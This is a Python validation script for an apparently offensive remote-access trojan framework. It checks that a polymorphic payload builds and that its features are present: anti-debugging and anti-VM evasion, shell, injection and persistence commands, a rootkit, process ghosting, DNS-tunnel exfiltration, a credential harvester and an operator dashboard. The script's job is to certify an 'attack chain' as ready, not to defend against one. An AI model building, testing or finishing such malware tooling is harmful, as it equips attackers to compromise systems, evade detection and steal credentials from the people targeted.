#!/usr/bin/env python3
"""
COMPREHENSIVE INTEGRATION VALIDATOR
Tests all Phase 1-3 components working together
"""

import os
import sys
import json
import time
import socket
import threading
import subprocess
import requests
import hashlib
import tempfile
from pathlib import Path
import signal
import psutil

class IntegrationValidator:
    def __init__(self):
        self.results = {
            'phase1': {'tests': 0, 'passed': 0, 'failed': 0},
            'phase2': {'tests': 0, 'passed': 0, 'failed': 0},
            'phase3': {'tests': 0, 'passed': 0, 'failed': 0},
            'integration': {'tests': 0, 'passed': 0, 'failed': 0},
            'issues': [],
            'critical': []
        }
        self.server_proc = None
        self.server_url = 'http://localhost:19876'
        
    def log(self, msg, level="INFO"):
        colors = {
            "TEST": "\033[95m",
            "PASS": "\033[92m",
            "FAIL": "\033[91m",
            "INFO": "\033[94m",
            "WARN": "\033[93m"
        }
        print(f"{colors.get(level, '')}[{level}] {msg}\033[0m")
        
    def test(self, phase, name, condition, critical=False):
        """Run a single test"""
        self.results[phase]['tests'] += 1
        
        if condition:
            self.results[phase]['passed'] += 1
            self.log(f"✓ {name}", "PASS")
            return True
        else:
            self.results[phase]['failed'] += 1
            self.log(f"✗ {name}", "FAIL")
            
            if critical:
                self.results['critical'].append(name)
            else:
                self.results['issues'].append(name)
            return False
            
    # ============= PHASE 1 TESTS =============
    
    def test_phase1_compilation(self):
        """Test that payload compiles with all features"""
        self.log("\n" + "="*60, "TEST")
        self.log("PHASE 1: COMPILATION & CORE FEATURES", "TEST")
        self.log("="*60, "TEST")
        
        # Test standard compilation
        os.chdir('/workspace/native_payloads')
        result = subprocess.run(['bash', 'build.sh'], capture_output=True)
        
        self.test('phase1', 'Payload compilation', 
                 result.returncode == 0, critical=True)
        
        # Test binary exists and size
        binary = Path('/workspace/native_payloads/output/payload_native')
        self.test('phase1', 'Binary exists', binary.exists())
        
        if binary.exists():
            size = binary.stat().st_size
            self.test('phase1', f'Binary size reasonable ({size} bytes)', 
                     10000 < size < 100000)
            
        # Test polymorphism
        from native_payload_builder import native_builder
        
        hashes = []
        for i in range(3):
            config = {'platform': 'linux', 'c2_host': 'localhost', 'c2_port': 4433 + i}
            result = native_builder.compile_payload(config)
            
            if result['success']:
                hashes.append(result['hash'])
                
        self.test('phase1', 'Polymorphic builds (different hashes)',
                 len(set(hashes)) == len(hashes))
        
        # Test anti-analysis features in source
        utils_file = Path('/workspace/native_payloads/core/utils.c')
        if utils_file.exists():
            content = utils_file.read_text()
            
            self.test('phase1', 'Anti-debugging implemented',
                     'detect_debugger' in content)
            self.test('phase1', 'Anti-VM implemented',
                     'detect_vm' in content)
            self.test('phase1', 'Anti-sandbox implemented',
                     'detect_sandbox' in content)
                     
    def test_phase1_commands(self):
        """Test command implementations"""
        self.log("\nPHASE 1: COMMAND HANDLERS", "TEST")
        
        commands_file = Path('/workspace/native_payloads/core/commands.c')
        if not commands_file.exists():
            self.test('phase1', 'Commands file exists', False, critical=True)
            return
            
        content = commands_file.read_text()
        
        commands = [
            'cmd_ping', 'cmd_exec', 'cmd_sysinfo', 'cmd_ps_list',
            'cmd_shell', 'cmd_download', 'cmd_upload', 'cmd_inject',
            'cmd_persist', 'cmd_killswitch'
        ]
        
        for cmd in commands:
            self.test('phase1', f'Command {cmd} implemented',
                     f'int {cmd}(' in content)
                     
    def test_phase1_encryption(self):
        """Test encryption implementation"""
        self.log("\nPHASE 1: ENCRYPTION", "TEST")
        
        aes_file = Path('/workspace/native_payloads/crypto/aes.c')
        sha_file = Path('/workspace/native_payloads/crypto/sha256.c')
        
        self.test('phase1', 'AES implementation exists', aes_file.exists())
        self.test('phase1', 'SHA256 implementation exists', sha_file.exists())
        
        if aes_file.exists():
            content = aes_file.read_text()
            self.test('phase1', 'AES CTR mode implemented',
                     'aes256_ctr_crypt' in content or 'aes256_ctr' in content)
                     
    # ============= PHASE 2 TESTS =============
    
    def test_phase2_injection(self):
        """Test injection framework"""
        self.log("\n" + "="*60, "TEST")
        self.log("PHASE 2: PROCESS INJECTION", "TEST")
        self.log("="*60, "TEST")
        
        # Test injection files exist
        inject_files = [
            '/workspace/native_payloads/inject/inject_core.c',
            '/workspace/native_payloads/inject/inject_core.h',
            '/workspace/native_payloads/inject/inject_linux.c',
            '/workspace/native_payloads/inject/inject_windows.c'
        ]
        
        for filepath in inject_files:
            self.test('phase2', f'{Path(filepath).name} exists',
                     Path(filepath).exists())
                     
        # Test injection manager
        try:
            from injection_manager import injection_manager
            
            processes = injection_manager.enumerate_processes()
            self.test('phase2', 'Process enumeration works',
                     len(processes) > 0)
                     
            if processes:
                score = injection_manager.calculate_injection_score(processes[0])
                self.test('phase2', 'Injection scoring works',
                         0 <= score <= 100)
                         
            techniques = injection_manager.get_available_techniques()
            self.test('phase2', 'Injection techniques available',
                     len(techniques) >= 3)
                     
        except Exception as e:
            self.test('phase2', f'Injection manager works', False)
            self.results['issues'].append(f'Injection manager: {e}')
            
    # ============= PHASE 3 TESTS =============
    
    def test_phase3_modules(self):
        """Test Phase 3 advanced modules"""
        self.log("\n" + "="*60, "TEST")
        self.log("PHASE 3: ADVANCED MODULES", "TEST")
        self.log("="*60, "TEST")
        
        # Test rootkit
        rootkit_file = Path('/workspace/native_payloads/rootkit/stitch_rootkit.c')
        control_file = Path('/workspace/native_payloads/rootkit/stitch_control')
        
        self.test('phase3', 'Rootkit source exists', rootkit_file.exists())
        self.test('phase3', 'Rootkit control utility exists', control_file.exists())
        
        # Test process ghosting
        ghost_file = Path('/workspace/native_payloads/evasion/process_ghost')
        self.test('phase3', 'Process ghosting tool exists', ghost_file.exists())
        
        # Test DNS tunneling
        dns_file = Path('/workspace/native_payloads/exfil/dns_tunnel')
        self.test('phase3', 'DNS tunnel tool exists', dns_file.exists())
        
        # Test credential harvester
        cred_file = Path('/workspace/native_payloads/harvest/cred_harvester')
        self.test('phase3', 'Credential harvester exists', cred_file.exists())
        
    def test_phase3_command_handlers(self):
        """Test Phase 3 command handlers in payload"""
        self.log("\nPHASE 3: COMMAND HANDLERS", "TEST")
        
        commands_file = Path('/workspace/native_payloads/core/commands.c')
        if commands_file.exists():
            content = commands_file.read_text()
            
            phase3_commands = [
                'cmd_install_rootkit',
                'cmd_ghost_process',
                'cmd_harvest_creds',
                'cmd_setup_dns_tunnel'
            ]
            
            for cmd in phase3_commands:
                self.test('phase3', f'{cmd} handler exists',
                         f'{cmd}(' in content)
                         
    # ============= INTEGRATION TESTS =============
    
    def test_web_integration(self):
        """Test web server integration"""
        self.log("\n" + "="*60, "TEST")
        self.log("INTEGRATION: WEB SERVER & APIs", "TEST")
        self.log("="*60, "TEST")
        
        # Start web server
        env = os.environ.copy()
        env.update({
            'STITCH_ADMIN_USER': 'admin',
            'STITCH_ADMIN_PASSWORD': 'SecureTestPassword123!',
            'STITCH_WEB_PORT': '19876',
            'STITCH_DEBUG': 'true'
        })
        
        self.server_proc = subprocess.Popen(
            ['python3', '/workspace/web_app_real.py'],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            env=env,
            preexec_fn=os.setsid
        )
        
        # Wait for startup
        time.sleep(5)
        
        if self.server_proc.poll() is None:
            self.test('integration', 'Web server starts', True)
            
            # Test endpoints
            try:
                # Main page
                r = requests.get(self.server_url, timeout=2)
                self.test('integration', 'Dashboard accessible',
                         r.status_code in [200, 302])
                
                # Check Phase 3 endpoints exist in source
                web_file = Path('/workspace/web_app_real.py')
                if web_file.exists():
                    content = web_file.read_text()
                    
                    endpoints = [
                        '/api/target/<target_id>/action',
                        '/api/target/<target_id>/info',
                        '/api/task/<task_id>/status',
                        '/api/credentials'
                    ]
                    
                    for endpoint in endpoints:
                        self.test('integration', f'Endpoint {endpoint} defined',
                                 endpoint in content)
                                 
            except Exception as e:
                self.test('integration', 'API endpoints accessible', False)
                self.results['issues'].append(f'Web API error: {e}')
        else:
            self.test('integration', 'Web server starts', False, critical=True)
            
    def test_frontend_integration(self):
        """Test frontend components"""
        self.log("\nINTEGRATION: FRONTEND", "TEST")
        
        # Check JS files
        js_files = [
            '/workspace/static/js/native_payload.js',
            '/workspace/static/js/injection_ui.js',
            '/workspace/static/js/advanced_controls.js'
        ]
        
        for filepath in js_files:
            file_exists = Path(filepath).exists()
            self.test('integration', f'{Path(filepath).name} exists', file_exists)
            
            if file_exists:
                content = Path(filepath).read_text()
                
                # Check for key functions
                if 'advanced_controls' in filepath:
                    self.test('integration', 'AdvancedRATControls class defined',
                             'class AdvancedRATControls' in content)
                    self.test('integration', 'Execute action function defined',
                             'executeAction' in content)
                    self.test('integration', 'WebSocket integration',
                             'socket.on' in content)
                             
        # Check dashboard HTML
        dashboard = Path('/workspace/templates/dashboard_real.html')
        if dashboard.exists():
            content = dashboard.read_text()
            
            self.test('integration', 'Advanced controls script included',
                     'advanced_controls.js' in content)
            self.test('integration', 'Process injection section exists',
                     'process-injection-section' in content)
                     
    def test_command_flow(self):
        """Test command flow from dashboard to payload"""
        self.log("\nINTEGRATION: COMMAND FLOW", "TEST")
        
        # Check command definitions in the correct header file
        commands_h = Path('/workspace/native_payloads/core/commands.h')
        if commands_h.exists():
            content = commands_h.read_text()
            
            self.test('integration', 'Phase 3 commands defined',
                     'CMD_INSTALL_ROOTKIT' in content)
                     
        # Check command routing in web app
        web_file = Path('/workspace/web_app_real.py')
        if web_file.exists():
            content = web_file.read_text()
            
            self.test('integration', 'Rootkit action handler',
                     "action == 'rootkit'" in content)
            self.test('integration', 'Harvest action handler',
                     "action == 'harvest'" in content)
            self.test('integration', 'DNS tunnel action handler',
                     "action == 'dns_tunnel'" in content)
                     
    def test_end_to_end(self):
        """Test complete attack chain"""
        self.log("\nINTEGRATION: END-TO-END FLOW", "TEST")
        
        # This would test:
        # 1. Payload generation
        # 2. C2 connection
        # 3. Command execution
        # 4. Phase 3 features
        
        # For safety, we just verify the components exist
        self.test('integration', 'Attack chain components ready',
                 self.results['phase1']['failed'] == 0 and
                 self.results['phase2']['failed'] == 0 and
                 self.results['phase3']['failed'] == 0)
                 
    # ============= VALIDATION =============
    
    def validate_all(self):
        """Run all validation tests"""
        self.log("="*60, "TEST")
        self.log("COMPREHENSIVE INTEGRATION VALIDATION", "TEST")
        self.log("="*60, "TEST")
        
        # Phase 1
        self.test_phase1_compilation()
        self.test_phase1_commands()
        self.test_phase1_encryption()
        
        # Phase 2
        self.test_phase2_injection()
        
        # Phase 3
        self.test_phase3_modules()
        self.test_phase3_command_handlers()
        
        # Integration
        self.test_web_integration()
        self.test_frontend_integration()
        self.test_command_flow()
        self.test_end_to_end()
        
        # Cleanup
        if self.server_proc:
            try:
                os.killpg(os.getpgid(self.server_proc.pid), signal.SIGTERM)
            except:
                pass
                
    def generate_report(self):
        """Generate validation report"""
        self.log("\n" + "="*60, "TEST")
        self.log("VALIDATION REPORT", "TEST")
        self.log("="*60, "TEST")
        
        total_tests = sum(p['tests'] for p in self.results.values() if isinstance(p, dict))
        total_passed = sum(p['passed'] for p in self.results.values() if isinstance(p, dict))
        total_failed = sum(p['failed'] for p in self.results.values() if isinstance(p, dict))
        
        self.log(f"\nTOTAL: {total_tests} tests", "INFO")
        self.log(f"PASSED: {total_passed} ({total_passed*100//total_tests if total_tests else 0}%)", "PASS")
        self.log(f"FAILED: {total_failed}", "FAIL" if total_failed > 0 else "INFO")
        
        # Phase breakdown
        for phase in ['phase1', 'phase2', 'phase3', 'integration']:
            data = self.results[phase]
            self.log(f"\n{phase.upper()}:", "TEST")
            self.log(f"  Tests: {data['tests']}", "INFO")
            self.log(f"  Passed: {data['passed']}", "PASS" if data['passed'] > 0 else "INFO")
            self.log(f"  Failed: {data['failed']}", "FAIL" if data['failed'] > 0 else "INFO")
            
        # Critical issues
        if self.results['critical']:
            self.log(f"\n🚨 CRITICAL ISSUES ({len(self.results['critical'])}):", "FAIL")
            for issue in self.results['critical']:
                self.log(f"  - {issue}", "FAIL")
                
        # Regular issues
        if self.results['issues']:
            self.log(f"\n⚠️  ISSUES ({len(self.results['issues'])}):", "WARN")
            for issue in self.results['issues'][:10]:
                self.log(f"  - {issue}", "WARN")
                
        # Final verdict
        self.log("\n" + "="*60, "TEST")
        
        if total_failed == 0:
            self.log("✅ INTEGRATION COMPLETE - ALL TESTS PASSED!", "PASS")
            confidence = 100
        elif len(self.results['critical']) == 0:
            self.log("⚠️  INTEGRATION FUNCTIONAL - MINOR ISSUES", "WARN")
            confidence = 85
        else:
            self.log("❌ INTEGRATION INCOMPLETE - CRITICAL ISSUES", "FAIL")
            confidence = 60
            
        self.log(f"CONFIDENCE LEVEL: {confidence}%", "TEST")
        
        # Save report
        with open('/workspace/integration_report.json', 'w') as f:
            json.dump(self.results, f, indent=2)
            
        return confidence >= 85

def main():
    validator = IntegrationValidator()
    
    try:
        validator.validate_all()
        success = validator.generate_report()
        
        return 0 if success else 1
        
    except KeyboardInterrupt:
        print("\n\nValidation interrupted")
        return 1
    except Exception as e:
        print(f"\n\nValidation error: {e}")
        return 1
        
if __name__ == '__main__':
    sys.exit(main())